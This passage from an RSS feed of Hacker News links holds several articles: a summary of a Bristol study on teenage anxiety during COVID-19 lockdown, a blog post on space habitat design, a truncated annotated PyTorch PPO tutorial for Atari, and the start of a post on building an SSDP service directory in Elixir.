Emily Widnall, Senior Research Associate in Population Health Sciences at the University of Bristol’s Medical School.</p><p>"While we saw anxiety levels rise for a few of our participants, it was a big surprise to discover quite the opposite was the case for many of them. Of particular interest, those students who felt least connected to school before the lockdown saw a larger decrease in anxiety which raises questions about how the school environment affects some younger teenagers’ mental well-being.”</p><p>Depression levels remained fairly consistent over time, with a 2 per cent decrease of boys at risk of depression and a 3 per cent increase in girls at risk of depression.</p><p>“This was again unexpected and arguably shows the resilience of young people and their ability to adapt to challenging situations,” Widnall said.</p><p>“Amidst other headlines highlighting concerns about young people’s mental health being negatively affected, this is in one sense very welcome news, but at the same time it raises interesting questions about what the key drivers and triggers of anxiety or depression are for this particular age group.”</p><p>Many students’ sense of well-being also improved during lockdown, with boys showing a bigger improvement than girls. Those with the lowest levels of well-being pre-pandemic benefited most, with their scores increasing by 14 per cent compared to no increase in those with average to above average well-being.</p><p>“The survey gives a unique insight into how many younger teenagers feel without the day-to-day pressures of school life, for example academic achievement and challenging peer relationships, in their lives,” Widnall said.</p><p>Despite not attending, boys and girls both reported stronger connectedness to school during lockdown, with marked increases in the number of students who said they get the opportunity to talk with their teachers.</p><p>“This was another surprise finding. You would imagine being away from school would logically make you feel more distant and less connected. It will be interesting for further research to explore the reasons why young people reported feeling more connected to school, but one possible explanation could be the new ways that teachers found to engage with students via digital platforms, which of course young people are already very familiar with,” Widnall said.</p><p>Survey results showed reduced anxiety and improved well-being coincided with significantly greater usage of social media among girls. The biggest increase was seen during the week, when more than half of girls (55 per cent) reported spending in excess of three hours daily on social media during lockdown.</p><p>“This challenges the common perception that social media has a detrimental impact on young people’s mental health. The statistics for girls within this survey suggest these channels may play an important role in helping teenagers bond, feel more connected and in touch, especially during a period of physical isolation,” Widnall said.</p><p>“Respondents, especially girls, also reported using social media as a tool for learning, rather than just browsing or chatting amongst friends.”</p><p>The survey involved more than 1,000 year nine students from 17 secondary schools across the South West. Based on its findings, the report makes policy recommendations including prioritisation of student’s mental health and wellbeing alongside catch up on academic work and considering ways to prevent a rise in anxiety back to pre-pandemic levels.</p><p>Dr Judi Kidger, senior author and Lecturer in Public Health at the University of Bristol, said: “Our findings raise questions about the role of the school environment in explaining rises in mental health difficulties among teenagers in recent years. As schools re-open, we need to consider ways in which schools can be more supportive of mental health for all students.</p><p>"With children and young people having been out of the classroom for so long, and with many students in this study seeing improvements in mental health and well-being during that time, the case to address issues weighing on their quality of life at school is stronger than ever.”</p><p>–</p><p><b>Source: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.eurekalert.org%2Fpub_releases%2F2020-08%2Fuob-rry082120.php&amp;t=ZDEzZjNkYzk4NWY4MGFhOWU2NDgwZmMxNGY4YjBkMjg2NDRlM2IzMiwyb1RJU01saQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627296328752447488%2Fteenage-anxiety-covid-19-lockdown&amp;m=0&amp;ts=1598559769">University of Bristol</a></b></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/620827694184185856/lock-down-sleep-quality">Sleep during COVID-19 lockdown: Longer and more regular, yet worse</a></p><p><a href="https://nuadox.com/post/615500611887235072/social-distancing-2022">New study: Social distancing could be needed until 2022</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/covid19">covid19</a>
                                    
                                        <a href="https://nuadox.com/tagged/coronavirus">coronavirus</a>
                                    
                                        <a href="https://nuadox.com/tagged/mental-health">mental health</a>
                                    
                                        <a href="https://nuadox.com/tagged/teenagers">teenagers</a>
                                    
                                        <a href="https://nuadox.com/tagged/school">school</a>
                                    
                                        <a href="https://nuadox.com/tagged/education">education</a>
                                    
                                        <a href="https://nuadox.com/tagged/social-distancing">social distancing</a>
                                    
                                        <a href="https://nuadox.com/tagged/anxiety">anxiety</a>
                                    
                                        <a href="https://nuadox.com/tagged/stress">stress</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/public-health">public health</a>
                                    
                                        <a href="https://nuadox.com/tagged/depression">depression</a>
                                    
                                        <a href="https://nuadox.com/tagged/remote-learning">remote learning</a>
                                    
                                        <a href="https://nuadox.com/tagged/featured">featured</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/627296328752447488/teenage-anxiety-covid-19-lockdown</link>
            <guid isPermaLink="false">hacker-news-small-sites-24257147</guid>
            <pubDate>Mon, 24 Aug 2020 02:44:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Standard Space Habitats]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 42 (<a href="https://news.ycombinator.com/item?id=24257132">thread link</a>) | @luu
<br/>
August 23, 2020 | https://halcanary.org/vv/2020/07/14/3017/ | <a href="https://web.archive.org/web/*/https://halcanary.org/vv/2020/07/14/3017/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A refinement of O'Neill's colonies.</p><div>

<!-- BEGIN CONTENT -->
<p><a href="https://settlement.arc.nasa.gov/70sArtHiRes/70sArt/art.html"><img src="https://halcanary.org/images/Spacecolony1.jpg" alt="[A pair of O'Neill cylinders. https://settlement.arc.nasa.gov/70sArtHiRes/70sArt/art.html Interior view looking out through large windows. Art work: Rick Guidice.  NASA ID Number AC75-1086]" width="1920" height="1512"></a></p>
<p>Start with the idea of an <a href="https://en.wikipedia.org/wiki/O%27Neill_cylinder">O'Neill cylinder</a>: a spinning cylindrical space habitat 8 km in diameter and 32 km long.  The frequency of revolution is about two minutes.  This is a good diameter for a space habitat: if it is an order of magnitude larger, the structure won't hold together when it spins; an order of magnitude smaller, the Coriolis force is more noticeable.</p>
<p>The giant windows are a huge hazard for both radiation and meteor impacts.  Instead, make the cylinder a solid steel vessel, thick enough to block most radiation.  Make it out of many layers of steel sheeting, with a thick layer of ablative insulation on the outside that can absorb and redirect the kinetic energy of a meteor impact.  Construct it as several independent 8 km long segments, each with its own shielded endcaps, all sharing a common axis.  Each hab segment has airlocks at the axis, leading to rotating joints that connect the segment to two small non-rotating modules at the axis, where there are ports for visiting spacecraft to dock.  This is also where arrays of directional communication antennas are located.</p>
<p>At one end of the axis, there is a massive array of solar panels (not rotating with the hab), at the other, there is an array of radiators.  If the hab is too far from a star for solar power, a nuclear power plant is located outside of the hab, along the axis, in its own shielded module, as far away as needed to minimize radiation hazards to humans entering and exiting the habitat at the docking port module.</p>
<p>The ecology and economy of the hab is 99.9% closed - with energy as an input and heat as an output.  Occasionally, robots are sent out to mine asteroids or comets for material to replace material losses.  I expect that the solar power and radiator arrays will need constant maintenance and replacement to keep working at 100% capacity.  All of the habs in a star system exchange information, allowing the occupants of the habs to share and trade art, science, and culture.</p>
<p>The inside of the hab segment is either completely open or is segmented into many smaller "cells" big enough to feel open but small enough to give the human population more room.  A cell might have a ceiling 100 meters tall that looks like Earth's sky and provides similar light.  Some of the interior volume is taken up by light industry and vertical-farm-based agriculture.</p>
<p>This design is meant to be very robust and adaptable.  It doesn't matter if the hab is located in orbit around a red dwarf or a blue giant, as long as the solar panels work.  The hab can be sent on a thousand-year interstellar voyage as long as enough spare energy and material is taken along.  The occupants of the hab can remotely supervise robots to build new habs.</p>
<p>This is the future for humanity if we don't become post-human.  There aren't any planets out there that we can walk around in shirtsleeves on.  Terraforming projects would take many thousands of years at best, and might fall afoul of the law of unintended consequences.  Even Mars, one of the best possible places for humans to live outside of Earth, might not have enough gravity for standard humans to thrive.</p>
<p>I'm not saying rocky planets and moons aren't useful.  After all, that's where a lot of the useable material is.  But if you need that material, why not supervise robot miners from orbit?  Especially if the planet has a surface gravity of 1.5g or a surface temperature of 700 K.</p>
<hr>
<p>Discuss: <a href="https://twitter.com/halcanary/status/1283090742852886528">twitter</a>, <a href="https://www.reddit.com/user/hwc/comments/hrmyxc/standard_space_habitats/">reddit</a>.</p>

<!-- END CONTENT -->

      </div></div>]]>
            </description>
            <link>https://halcanary.org/vv/2020/07/14/3017/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24257132</guid>
            <pubDate>Mon, 24 Aug 2020 02:42:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Annotated PPO Reinforcement Learning Implementation for Atari]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24257068">thread link</a>) | @vpj
<br/>
August 23, 2020 | http://blog.varunajayasiri.com/ml/ppo_pytorch.html | <a href="https://web.archive.org/web/*/http://blog.varunajayasiri.com/ml/ppo_pytorch.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
    
    
    <div id="section-0">
        <div>
                
                <p>The code for this tutorial is available at
<a href="https://github.com/lab-ml/rl_samples">Github labml/rl_samples</a>.
And the web version of the tutorial is available
<a href="http://blog.varunajayasiri.com/ml/ppo_pytorch.html">on my blog</a>.</p>
<p>The implementation has four main classes.</p>
<ul>
<li><a href="#game">Game</a> - a wrapper for gym environment</li>
<li><a href="#model">Model</a> - neural network model for policy and value function</li>
<li><a href="#trainer">Trainer</a> - policy and value function updater</li>
<li><a href="#main">Math</a> - runs the training loop; sampling and training</li>
</ul>
<p>If someone reading this has any questions or comments
 please find me on Twitter,
 <strong><a href="https://twitter.com/vpj">@vpj</a></strong>.</p>
            </div>
            <div>
                <div><pre><span></span><span>import</span> <span>multiprocessing</span>
<span>import</span> <span>multiprocessing.connection</span>
<span>import</span> <span>time</span>
<span>from</span> <span>typing</span> <span>import</span> <span>Dict</span><span>,</span> <span>List</span>

<span>import</span> <span>cv2</span>
<span>import</span> <span>gym</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>torch</span>
<span>from</span> <span>labml</span> <span>import</span> <span>monit</span><span>,</span> <span>tracker</span><span>,</span> <span>logger</span><span>,</span> <span>experiment</span>
<span>from</span> <span>torch</span> <span>import</span> <span>nn</span>
<span>from</span> <span>torch</span> <span>import</span> <span>optim</span>
<span>from</span> <span>torch.distributions</span> <span>import</span> <span>Categorical</span>
<span>from</span> <span>torch.nn</span> <span>import</span> <span>functional</span> <span>as</span> <span>F</span>

<span>if</span> <span>torch</span><span>.</span><span>cuda</span><span>.</span><span>is_available</span><span>():</span>
    <span>device</span> <span>=</span> <span>torch</span><span>.</span><span>device</span><span>(</span><span>"cuda:0"</span><span>)</span>
<span>else</span><span>:</span>
    <span>device</span> <span>=</span> <span>torch</span><span>.</span><span>device</span><span>(</span><span>"cpu"</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-1">
        <div>
                
                <h2><a name="game-environment"></a>Game environment</h2>
<p>This is a wrapper for OpenAI gym game environment.
We do a few things here:</p>
<ol>
<li>Apply the same action on four frames</li>
<li>Convert observation frames to gray and scale it to (84, 84)</li>
<li>Take the maximum of last two of those four frames</li>
<li>Collect four such frames for last three actions</li>
<li>Add episode information (total reward for the entire episode) for monitoring</li>
<li>Restrict an episode to a single life (game has 5 lives, we reset after every single life)</li>
</ol>
<h4>Observation format</h4>
<p>Observation is tensor of size (84, 84, 4). It is four frames
(images of the game screen) stacked on last axis.
i.e, each channel is a frame.</p>
<pre><code>Frames    00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15
Actions   a1 a1 a1 a1 a2 a2 a2 a2 a3 a3 a3 a3 a4 a4 a4 a4
Max       -- -- MM MM -- -- MM MM -- -- MM MM -- -- MM MM
Stacked   -- -- Stack -- -- Stack -- -- Stack -- -- Stack
</code></pre>
            </div>
            
        </div>
    
    <div id="section-3">
        
            <div>
                <div><pre>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>seed</span><span>:</span> <span>int</span><span>):</span></pre></div>
            </div>
        </div>
    
    <div id="section-5">
            
            <div>
                <div><pre>        <span>self</span><span>.</span><span>env</span> <span>=</span> <span>gym</span><span>.</span><span>make</span><span>(</span><span>'BreakoutNoFrameskip-v4'</span><span>)</span>
        <span>self</span><span>.</span><span>env</span><span>.</span><span>seed</span><span>(</span><span>seed</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-6">
            <div>
                
                <p>buffer to take the maximum of last 2 frames for each action</p>
            </div>
            <div>
                <div><pre>        <span>self</span><span>.</span><span>obs_2_max</span> <span>=</span> <span>np</span><span>.</span><span>zeros</span><span>((</span><span>2</span><span>,</span> <span>84</span><span>,</span> <span>84</span><span>,</span> <span>1</span><span>),</span> <span>np</span><span>.</span><span>uint8</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-7">
            <div>
                
                <p>tensor for a stack of 4 frames</p>
            </div>
            <div>
                <div><pre>        <span>self</span><span>.</span><span>obs_4</span> <span>=</span> <span>np</span><span>.</span><span>zeros</span><span>((</span><span>84</span><span>,</span> <span>84</span><span>,</span> <span>4</span><span>))</span></pre></div>
            </div>
        </div>
    <div id="section-8">
            <div>
                
                <p>keep track of the episode rewards</p>
            </div>
            
        </div>
    
    <div id="section-10">
        <div>
                
                <h3>Step</h3>
<p>Executes <code>action</code> for 4 time steps and
 returns a tuple of (observation, reward, done, episode_info).</p>
<ul>
<li><code>observation</code>: stacked 4 frames (this frame and frames for last 3 actions) as described above</li>
<li><code>reward</code>: total reward while the action was executed</li>
<li><code>done</code>: whether the episode finished (a life lost)</li>
<li><code>episode_info</code>: episode information if completed</li>
</ul>
            </div>
            
        </div>
    
    
    <div id="section-13">
            <div>
                
                <p>execute the action in the OpenAI Gym environment</p>
            </div>
            <div>
                <div><pre>            <span>obs</span><span>,</span> <span>r</span><span>,</span> <span>done</span><span>,</span> <span>info</span> <span>=</span> <span>self</span><span>.</span><span>env</span><span>.</span><span>step</span><span>(</span><span>action</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-14">
            <div>
                
                <p>add last two frames to buffer</p>
            </div>
            <div>
                <div><pre>            <span>if</span> <span>i</span> <span>&gt;=</span> <span>2</span><span>:</span>
                <span>self</span><span>.</span><span>obs_2_max</span><span>[</span><span>i</span> <span>%</span> <span>2</span><span>]</span> <span>=</span> <span>self</span><span>.</span><span>_process_obs</span><span>(</span><span>obs</span><span>)</span>

            <span>reward</span> <span>+=</span> <span>r</span></pre></div>
            </div>
        </div>
    <div id="section-15">
            
            <div>
                <div><pre>            <span>lives</span> <span>=</span> <span>self</span><span>.</span><span>env</span><span>.</span><span>unwrapped</span><span>.</span><span>ale</span><span>.</span><span>lives</span><span>()</span></pre></div>
            </div>
        </div>
    <div id="section-16">
            
            <div>
                <div><pre>            <span>if</span> <span>lives</span> <span>&lt;</span> <span>self</span><span>.</span><span>lives</span><span>:</span>
                <span>done</span> <span>=</span> <span>True</span>
            <span>self</span><span>.</span><span>lives</span> <span>=</span> <span>lives</span></pre></div>
            </div>
        </div>
    
    <div id="section-18">
            <div>
                
                <p>maintain rewards for each step</p>
            </div>
            <div>
                <div><pre>        <span>self</span><span>.</span><span>rewards</span><span>.</span><span>append</span><span>(</span><span>reward</span><span>)</span>

        <span>if</span> <span>done</span><span>:</span></pre></div>
            </div>
        </div>
    <div id="section-19">
            <div>
                
                <p>if finished, set episode information if episode is over, and reset</p>
            </div>
            <div>
                <div><pre>            <span>episode_info</span> <span>=</span> <span>{</span><span>"reward"</span><span>:</span> <span>sum</span><span>(</span><span>self</span><span>.</span><span>rewards</span><span>),</span>
                            <span>"length"</span><span>:</span> <span>len</span><span>(</span><span>self</span><span>.</span><span>rewards</span><span>)}</span>
            <span>self</span><span>.</span><span>reset</span><span>()</span>
        <span>else</span><span>:</span>
            <span>episode_info</span> <span>=</span> <span>None</span></pre></div>
            </div>
        </div>
    <div id="section-20">
            <div>
                
                <p>get the max of last two frames</p>
            </div>
            <div>
                <div><pre>            <span>obs</span> <span>=</span> <span>self</span><span>.</span><span>obs_2_max</span><span>.</span><span>max</span><span>(</span><span>axis</span><span>=</span><span>0</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-21">
            <div>
                
                <p>push it to the stack of 4 frames</p>
            </div>
            <div>
                <div><pre>            <span>self</span><span>.</span><span>obs_4</span> <span>=</span> <span>np</span><span>.</span><span>roll</span><span>(</span><span>self</span><span>.</span><span>obs_4</span><span>,</span> <span>shift</span><span>=-</span><span>1</span><span>,</span> <span>axis</span><span>=-</span><span>1</span><span>)</span>
            <span>self</span><span>.</span><span>obs_4</span><span>[</span><span>...</span><span>,</span> <span>-</span><span>1</span><span>:]</span> <span>=</span> <span>obs</span>

        <span>return</span> <span>self</span><span>.</span><span>obs_4</span><span>,</span> <span>reward</span><span>,</span> <span>done</span><span>,</span> <span>episode_info</span></pre></div>
            </div>
        </div>
    <div id="section-22">
        <div>
                
                <h3>Reset environment</h3>
<p>Clean up episode info and 4 frame stack</p>
            </div>
            
        </div>
    
    <div id="section-24">
            <div>
                
                <p>reset OpenAI Gym environment</p>
            </div>
            
        </div>
    <div id="section-25">
            
            <div>
                <div><pre>        <span>obs</span> <span>=</span> <span>self</span><span>.</span><span>_process_obs</span><span>(</span><span>obs</span><span>)</span>
        <span>self</span><span>.</span><span>obs_4</span><span>[</span><span>...</span><span>,</span> <span>0</span><span>:]</span> <span>=</span> <span>obs</span>
        <span>self</span><span>.</span><span>obs_4</span><span>[</span><span>...</span><span>,</span> <span>1</span><span>:]</span> <span>=</span> <span>obs</span>
        <span>self</span><span>.</span><span>obs_4</span><span>[</span><span>...</span><span>,</span> <span>2</span><span>:]</span> <span>=</span> <span>obs</span>
        <span>self</span><span>.</span><span>obs_4</span><span>[</span><span>...</span><span>,</span> <span>3</span><span>:]</span> <span>=</span> <span>obs</span>
        <span>self</span><span>.</span><span>rewards</span> <span>=</span> <span>[]</span>

        <span>self</span><span>.</span><span>lives</span> <span>=</span> <span>self</span><span>.</span><span>env</span><span>.</span><span>unwrapped</span><span>.</span><span>ale</span><span>.</span><span>lives</span><span>()</span>

        <span>return</span> <span>self</span><span>.</span><span>obs_4</span></pre></div>
            </div>
        </div>
    <div id="section-26">
        <div>
                
                <h4>Process game frames</h4>
<p>Convert game frames to gray and rescale to 84x84</p>
            </div>
            <div>
                <div><pre>    <span>@staticmethod</span>
    <span>def</span> <span>_process_obs</span><span>(</span><span>obs</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-27">
            
            <div>
                <div><pre>        <span>obs</span> <span>=</span> <span>cv2</span><span>.</span><span>cvtColor</span><span>(</span><span>obs</span><span>,</span> <span>cv2</span><span>.</span><span>COLOR_RGB2GRAY</span><span>)</span>
        <span>obs</span> <span>=</span> <span>cv2</span><span>.</span><span>resize</span><span>(</span><span>obs</span><span>,</span> <span>(</span><span>84</span><span>,</span> <span>84</span><span>),</span> <span>interpolation</span><span>=</span><span>cv2</span><span>.</span><span>INTER_AREA</span><span>)</span>
        <span>return</span> <span>obs</span><span>[:,</span> <span>:,</span> <span>None</span><span>]</span>  <span># Shape (84, 84, 1)</span></pre></div>
            </div>
        </div>
    <div id="section-28">
        <div>
                
                <h2>Worker Process</h2>
<p>Each worker process runs this method</p>
            </div>
            <div>
                <div><pre><span>def</span> <span>worker_process</span><span>(</span><span>remote</span><span>:</span> <span>multiprocessing</span><span>.</span><span>connection</span><span>.</span><span>Connection</span><span>,</span> <span>seed</span><span>:</span> <span>int</span><span>):</span></pre></div>
            </div>
        </div>
    
    
    <div id="section-31">
            <div>
                
                <p>wait for instructions from the connection and execute them</p>
            </div>
            <div>
                <div><pre>    <span>while</span> <span>True</span><span>:</span>
        <span>cmd</span><span>,</span> <span>data</span> <span>=</span> <span>remote</span><span>.</span><span>recv</span><span>()</span>
        <span>if</span> <span>cmd</span> <span>==</span> <span>"step"</span><span>:</span>
            <span>remote</span><span>.</span><span>send</span><span>(</span><span>game</span><span>.</span><span>step</span><span>(</span><span>data</span><span>))</span>
        <span>elif</span> <span>cmd</span> <span>==</span> <span>"reset"</span><span>:</span>
            <span>remote</span><span>.</span><span>send</span><span>(</span><span>game</span><span>.</span><span>reset</span><span>())</span>
        <span>elif</span> <span>cmd</span> <span>==</span> <span>"close"</span><span>:</span>
            <span>remote</span><span>.</span><span>close</span><span>()</span>
            <span>break</span>
        <span>else</span><span>:</span>
            <span>raise</span> <span>NotImplementedError</span></pre></div>
            </div>
        </div>
    <div id="section-32">
        <div>
                
                <h2>Worker</h2>
<p>Creates a new worker and runs it in a separate process.</p>
            </div>
            
        </div>
    <div id="section-33">
            
            <div>
                <div><pre>    <span>child</span><span>:</span> <span>multiprocessing</span><span>.</span><span>connection</span><span>.</span><span>Connection</span>
    <span>process</span><span>:</span> <span>multiprocessing</span><span>.</span><span>Process</span></pre></div>
            </div>
        </div>
    <div id="section-34">
            
            <div>
                <div><pre>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>seed</span><span>):</span>
        <span>self</span><span>.</span><span>child</span><span>,</span> <span>parent</span> <span>=</span> <span>multiprocessing</span><span>.</span><span>Pipe</span><span>()</span>
        <span>self</span><span>.</span><span>process</span> <span>=</span> <span>multiprocessing</span><span>.</span><span>Process</span><span>(</span><span>target</span><span>=</span><span>worker_process</span><span>,</span> <span>args</span><span>=</span><span>(</span><span>parent</span><span>,</span> <span>seed</span><span>))</span>
        <span>self</span><span>.</span><span>process</span><span>.</span><span>start</span><span>()</span></pre></div>
            </div>
        </div>
    
    
    <div id="section-37">
            
            <div>
                <div><pre>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>):</span>
        <span>super</span><span>()</span><span>.</span><span>__init__</span><span>()</span></pre></div>
            </div>
        </div>
    <div id="section-38">
            <div>
                
                <p>The first convolution layer takes a
84x84 frame and produces a 20x20 frame</p>
            </div>
            <div>
                <div><pre>        <span>self</span><span>.</span><span>conv1</span> <span>=</span> <span>nn</span><span>.</span><span>Conv2d</span><span>(</span><span>in_channels</span><span>=</span><span>4</span><span>,</span>
                               <span>out_channels</span><span>=</span><span>32</span><span>,</span>
                               <span>kernel_size</span><span>=</span><span>8</span><span>,</span>
                               <span>stride</span><span>=</span><span>4</span><span>,</span>
                               <span>padding</span><span>=</span><span>0</span><span>)</span>
        <span>nn</span><span>.</span><span>init</span><span>.</span><span>orthogonal_</span><span>(</span><span>self</span><span>.</span><span>conv1</span><span>.</span><span>weight</span><span>,</span> <span>np</span><span>.</span><span>sqrt</span><span>(</span><span>2</span><span>))</span></pre></div>
            </div>
        </div>
    <div id="section-39">
            <div>
                
                <p>The second convolution layer takes a
20x20 frame and produces a 9x9 frame</p>
            </div>
            <div>
                <div><pre>        <span>self</span><span>.</span><span>conv2</span> <span>=</span> <span>nn</span><span>.</span><span>Conv2d</span><span>(</span><span>in_channels</span><span>=</span><span>32</span><span>,</span>
                               <span>out_channels</span><span>=</span><span>64</span><span>,</span>
                               <span>kernel_size</span><span>=</span><span>4</span><span>,</span>
                               <span>stride</span><span>=</span><span>2</span><span>,</span>
                               <span>padding</span><span>=</span><span>0</span><span>)</span>
        <span>nn</span><span>.</span><span>init</span><span>.</span><span>orthogonal_</span><span>(</span><span>self</span><span>.</span><span>conv2</span><span>.</span><span>weight</span><span>,</span> <span>np</span><span>.</span><span>sqrt</span><span>(</span><span>2</span><span>))</span></pre></div>
            </div>
        </div>
    <div id="section-40">
            <div>
                
                <p>The third convolution layer takes a
9x9 frame and produces a 7x7 frame</p>
            </div>
            <div>
                <div><pre>        <span>self</span><span>.</span><span>conv3</span> <span>=</span> <span>nn</span><span>.</span><span>Conv2d</span><span>(</span><span>in_channels</span><span>=</span><span>64</span><span>,</span>
                               <span>out_channels</span><span>=</span><span>64</span><span>,</span>
                               <span>kernel_size</span><span>=</span><span>3</span><span>,</span>
                               <span>stride</span><span>=</span><span>1</span><span>,</span>
                               <span>padding</span><span>=</span><span>0</span><span>)</span>
        <span>nn</span><span>.</span><span>init</span><span>.</span><span>orthogonal_</span><span>(</span><span>self</span><span>.</span><span>conv3</span><span>.</span><span>weight</span><span>,</span> <span>np</span><span>.</span><span>sqrt</span><span>(</span><span>2</span><span>))</span></pre></div>
            </div>
        </div>
    <div id="section-41">
            <div>
                
                <p>A fully connected layer takes the flattened
frame from thrid convolution layer, and outputs
512 features</p>
            </div>
            <div>
                <div><pre>        <span>self</span><span>.</span><span>lin</span> <span>=</span> <span>nn</span><span>.</span><span>Linear</span><span>(</span><span>in_features</span><span>=</span><span>7</span> <span>*</span> <span>7</span> <span>*</span> <span>64</span><span>,</span>
                             <span>out_features</span><span>=</span><span>512</span><span>)</span>
        <span>nn</span><span>.</span><span>init</span><span>.</span><span>orthogonal_</span><span>(</span><span>self</span><span>.</span><span>lin</span><span>.</span><span>weight</span><span>,</span> <span>np</span><span>.</span><span>sqrt</span><span>(</span><span>2</span><span>))</span></pre></div>
            </div>
        </div>
    <div id="section-42">
            <div>
                
                <p>A fully connected layer to get logits for $\pi$</p>
            </div>
            <div>
                <div><pre>        <span>self</span><span>.</span><span>pi_logits</span> <span>=</span> <span>nn</span><span>.</span><span>Linear</span><span>(</span><span>in_features</span><span>=</span><span>512</span><span>,</span>
                                   <span>out_features</span><span>=</span><span>4</span><span>)</span>
        <span>nn</span><span>.</span><span>init</span><span>.</span><span>orthogonal_</span><span>(</span><span>self</span><span>.</span><span>pi_logits</span><span>.</span><span>weight</span><span>,</span> <span>np</span><span>.</span><span>sqrt</span><span>(</span><span>0.01</span><span>))</span></pre></div>
            </div>
        </div>
    <div id="section-43">
            <div>
                
                <p>A fully connected layer to get value function</p>
            </div>
            <div>
                <div><pre>        <span>self</span><span>.</span><span>value</span> <span>=</span> <span>nn</span><span>.</span><span>Linear</span><span>(</span><span>in_features</span><span>=</span><span>512</span><span>,</span>
                               <span>out_features</span><span>=</span><span>1</span><span>)</span>
        <span>nn</span><span>.</span><span>init</span><span>.</span><span>orthogonal_</span><span>(</span><span>self</span><span>.</span><span>value</span><span>.</span><span>weight</span><span>,</span> <span>1</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-44">
            
            <div>
                <div><pre>    <span>de…</span></pre></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://blog.varunajayasiri.com/ml/ppo_pytorch.html">http://blog.varunajayasiri.com/ml/ppo_pytorch.html</a></em></p>]]>
            </description>
            <link>http://blog.varunajayasiri.com/ml/ppo_pytorch.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24257068</guid>
            <pubDate>Mon, 24 Aug 2020 02:24:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing an SSDP Directory in Elixir]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24256984">thread link</a>) | @luu
<br/>
August 23, 2020 | https://quinnwilton.com/blog/writing-an-ssdp-directory-in-elixir | <a href="https://web.archive.org/web/*/https://quinnwilton.com/blog/writing-an-ssdp-directory-in-elixir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <header>
      <a href="https://netscape-browser.en.softonic.com/" target="_blank">
        <img src="https://quinnwilton.com/images/netscape_now.gif">
      </a>
    </header>
<a href="https://quinnwilton.com/blog"><img src="https://quinnwilton.com/images/back.png"></a>

<section>
  
  <h2>2020-02-26</h2>

<p>I used to spend all of my free time programming random toy projects. Over time, likely after spending a few years in industry, I started to spend so much time thinking about how to write maintainable code that I think I started to lose out on what makes programming fun: exploring new ideas and learning how to do things I’ve never done before. I’d like to rediscover that joy, and to do that, I need to stop being so much of a perfectionist.</p>
<p>I think that in an office setting, deadlines force me to move on and call things done, but in my personal life, lack of that kind of pressure means that I can spend literally forever architecting and rearchitecting the same piece of code until it’s perfect (it never is).</p>
<p>To fix this, I’m going to try blogging! If I can make myself excited to share my code with other people, imperfect and unfinished as it is, then maybe I can start to unlearn the paralysis that’s been plaguing me for the past few years.</p>
<p>To start, I just want to walk through a small program I wrote a few months ago. I wanted to learn how <a href="https://en.wikipedia.org/wiki/Simple_Service_Discovery_Protocol">SSDP</a> works, so I implemented an SSDP Directory! For those of you who aren’t aware, SSDP is a fairly simple protocol from the 90s that’s used to facilitate the discovery of network services. Nowadays, it’s also used by everything from smart TVs to Hue lights.</p>
<p>My implementation can be found <a href="https://github.com/QuinnWilton/ssdp_directory">here</a>, and the (very readable!) RFC is <a href="https://tools.ietf.org/html/draft-cai-ssdp-v1-03">here</a>.</p>
<p>If I run the application, it discovers all of the devices on my network:</p>
<pre><code>iex(1)&gt; SSDPDirectory.list_services
%{
  "uuid:b236f169-9c9d-db64-ffff-ffffcff91970::upnp:rootdevice" =&gt; %SSDPDirectory.Service{
    location: "http://192.168.0.150:60000/upnp/dev/b236f169-9c9d-db64-ffff-ffffcff91970/desc",
    type: "upnp:rootdevice",
    usn: "uuid:b236f169-9c9d-db64-ffff-ffffcff91970::upnp:rootdevice"
  },
  ...
}</code></pre>
<p>The key to SSDP is what’s called <a href="https://en.wikipedia.org/wiki/Multicast">multicast addressing</a>. Essentially, services broadcast their presence to a specially designated multicast address, and then anyone else on the network is able to listen for those presence notifications in order to track the appearance and disappearance of new services.</p>
<p>Fortunately, Elixir, my language of choice, makes subscribing to these notifications <a href="https://github.com/QuinnWilton/ssdp_directory/blob/master/lib/ssdp_directory/multicast_channel.ex">easy</a>!</p>
<pre><code>defmodule SSDPDirectory.MulticastChannel do
  use GenServer

  alias __MODULE__

  alias SSDPDirectory.{
    Discovery,
    Presence
  }

  @multicast_group {239, 255, 255, 250}
  @multicast_port 1900

  def start_link(opts \\ []) do
    GenServer.start_link(__MODULE__, :ok, opts)
  end

  @spec broadcast(GenServer.name(), iodata) :: :ok
  def broadcast(channel \\ MulticastChannel, packet) do
